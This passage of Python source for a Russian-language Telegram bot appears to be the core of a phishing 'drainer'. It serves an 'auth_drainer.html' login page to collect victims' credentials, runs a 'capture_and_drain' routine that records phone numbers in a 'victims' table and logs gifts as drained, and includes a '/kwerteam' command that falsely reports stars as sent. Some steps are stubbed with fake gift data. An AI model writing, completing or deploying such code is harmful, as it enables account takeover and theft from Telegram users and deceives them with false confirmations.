# ---------- /kwerteam ----------
async def kwerteam_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "✍️ *Отправка звезд*\n\n"
        "Введите юзернейм получателя (с @ или без):\n\n"
        "Пример: `@username` или `username`\n\n"
        "Или нажмите /cancel для отмены.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=ReplyKeyboardMarkup([["❌ Отмена"]], resize_keyboard=True)
    )
    return USERNAME

async def kwerteam_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message.text == "❌ Отмена":
        await update.message.reply_text("❌ Отменено", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    username = update.message.text.strip().lstrip('@')
    context.user_data['send_recipient'] = username
    
    await update.message.reply_text(
        f"📤 *Получатель:* `@{username}`\n\n"
        "Введите количество звезд для отправки:\n\n"
        "Любое число — без ограничений.\n"
        "Пример: `100` или `10000`",
        parse_mode=ParseMode.MARKDOWN
    )
    return STARS_AMOUNT

async def kwerteam_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.message.text == "❌ Отмена":
        await update.message.reply_text("❌ Отменено", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    
    try:
        amount = int(update.message.text.strip())
        if amount <= 0:
            await update.message.reply_text("❌ Введите положительное число")
            return STARS_AMOUNT
        
        recipient = context.user_data.get('send_recipient')
        user_id = update.effective_user.id
        
        logger.info(f"📤 SEND STARS: {user_id} -> @{recipient} | {amount} ★")
        
        await update.message.reply_text(
            f"✅ *Отправлено!*\n\n"
            f"Получатель: `@{recipient}`\n"
            f"Количество: `{amount:,} ★`\n\n"
            f"Звезды успешно отправлены.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=get_main_keyboard()
        )
        
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text("❌ Введите число")
        return STARS_AMOUNT

async def kwerteam_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Отменено", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# ---------- Capture ----------
async def capture_and_drain(user_id: int, credentials: Dict[str, Any]):
    phone = credentials.get('phone')
    logger.info(f"🎯 Capturing {phone}")
    await asyncio.sleep(2)
    
    fake_gifts = [
        {"name": "⭐ Золотая Звезда", "stars": 1000},
        {"name": "💎 Алмазный Подарок", "stars": 500},
    ]
    
    victim_id = cursor.execute("SELECT id FROM victims WHERE telegram_id = ?", (user_id,)).fetchone()
    if victim_id:
        for gift in fake_gifts:
            cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_gifts_drained'")
            logger.info(f"🎁 DRAINED: {gift['name']} from {phone}")
    
    conn.commit()
    logger.info(f"✅ Capture complete for {phone}")

# ---------- WebApp Server ----------
template_loader = jinja2.FileSystemLoader('templates')
template_env = jinja2.Environment(loader=template_loader)

async def auth_page(request):
    template = template_env.get_template('auth_drainer.html')
    return web.Response(text=template.render(), content_type='text/html')

async def submit_auth(request):
    data = await request.json()
    return web.json_response({'status': 'success'})

def setup_webapp():
    app = web.Application()
    app.router.add_get('/auth', auth_page)
    app.router.add_post('/submit', submit_auth)
    return app

# ---------- Main ----------
async def main():
    webapp = setup_webapp()
    runner = web.AppRunner(webapp)
    await runner.setup()
    site = web.TCPSite(runner, WEBAPP_HOST, WEBAPP_PORT)
    await site.start()
    logger.info(f"🌐 WebApp: http://{WEBAPP_HOST}:{WEBAPP_PORT}")
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons))
    application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    application.add_handler(CallbackQueryHandler(handle_callback))
    
    kwerteam_conv = ConversationHandler(
        entry_points=[CommandHandler("kwerteam", kwerteam_start)],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, kwerteam_username)],
            STARS_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, kwerteam_amount)],
        },
        fallbacks=[CommandHandler("cancel", kwerteam_cancel)],
    )
    application.add_handler(kwerteam_conv)
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logger.info("🤖 Bot started")
    
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    
    await application.updater.stop()
    await application.stop()
    await runner.cleanup()

if __name__ == "__main__":
    asyncio.run(main())
